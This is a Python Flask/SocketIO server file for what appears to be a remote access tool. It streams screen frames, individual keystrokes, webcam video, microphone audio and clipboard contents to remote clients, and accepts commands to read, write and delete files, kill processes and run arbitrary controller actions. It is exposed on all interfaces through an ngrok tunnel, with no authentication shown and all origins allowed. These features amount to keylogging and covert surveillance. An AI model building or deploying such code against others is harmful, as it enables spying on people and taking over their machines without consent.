import os
from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO
import processes as proc
import file_manager as fm

app = Flask(__name__, template_folder="templates", static_folder="static")
app.config["SECRET_KEY"] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

_controller = None
_recorder   = None
_camera     = None
_mic        = None


def init(controller_fn, recorder, camera, mic=None):
    global _controller, _recorder, _camera, _mic
    _controller = controller_fn
    _recorder   = recorder
    _camera     = camera
    _mic        = mic


@app.route("/")
def index():
    return render_template("viewer.html")


# ── Camera ────────────────────────────────────────────────────────────────────
@socketio.on("mic_on")
def on_mic_on(_data=None):
    if _mic:
        ok = _mic.start()
        socketio.emit("mic_state", {"active": ok})

@socketio.on("mic_off")
def on_mic_off(_data=None):
    if _mic:
        _mic.stop()
        socketio.emit("mic_state", {"active": False})


@app.route("/camera/start", methods=["POST"])
def camera_start():
    if not _camera: return jsonify({"ok": False})
    ok = _camera.start()
    socketio.emit("camera_state", {"active": ok})
    return jsonify({"ok": ok})

@app.route("/camera/stop", methods=["POST"])
def camera_stop():
    if not _camera: return jsonify({"ok": False})
    _camera.stop()
    socketio.emit("camera_state", {"active": False})
    return jsonify({"ok": True})


# ── Processes ─────────────────────────────────────────────────────────────────
@app.route("/processes")
def get_processes():
    return jsonify(proc.get_processes())

@app.route("/processes/kill", methods=["POST"])
def kill_process():
    pid = request.json.get("pid")
    if not pid: return jsonify({"ok": False})
    ok = proc.kill_process(int(pid))
    return jsonify({"ok": ok})


# ── Control ───────────────────────────────────────────────────────────────────
@socketio.on("command")
def on_command(data):
    if _controller:
        try: _controller(data)
        except Exception: pass


# ── File Manager ──────────────────────────────────────────────────────────────
@socketio.on("list_dir")
def on_list_dir(data):
    path = data.get("path") or fm.home_dir()
    result = fm.list_dir(path)
    socketio.emit("dir_result", result)

@socketio.on("read_file")
def on_read_file(data):
    result = fm.read_file(data.get("path", ""))
    socketio.emit("file_data", result)

@socketio.on("write_file")
def on_write_file(data):
    result = fm.write_file(data.get("path", ""), data.get("data", ""))
    socketio.emit("write_result", result)

@socketio.on("delete_path")
def on_delete_path(data):
    result = fm.delete_path(data.get("path", ""))
    result["path"] = data.get("path", "")
    socketio.emit("delete_result", result)


# ── Broadcast helpers ─────────────────────────────────────────────────────────
def broadcast_frame(b64):      socketio.emit("frame",          {"data": b64})
def broadcast_key(char):       socketio.emit("key",            {"char": char})
def broadcast_camera(b64):     socketio.emit("camera_frame",   {"data": b64})
def broadcast_clipboard(text): socketio.emit("clipboard",      {"text": text})
def broadcast_ngrok_url(url):  socketio.emit("ngrok_url",      {"url": url})
def broadcast_audio(b64):      socketio.emit("audio",          {"data": b64})


def run(host="0.0.0.0", port=9090):
    socketio.run(app, host=host, port=port, allow_unsafe_werkzeug=True)
